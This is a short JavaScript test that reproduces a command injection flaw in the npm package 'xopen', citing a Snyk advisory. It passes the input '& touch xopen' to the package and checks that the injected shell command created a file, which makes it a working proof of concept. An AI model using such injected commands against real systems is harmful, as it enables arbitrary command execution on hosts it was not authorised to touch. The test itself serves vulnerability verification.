//https://snyk.io/vuln/SNYK-JS-XOPEN-1050981
test("Command Injection in xopen", () => {
  expect.assertions(2);
  const root = require("xopen");
  const fs = require("fs");
  const path = "./xopen";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let attack_code = "& touch xopen";
  root(attack_code);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
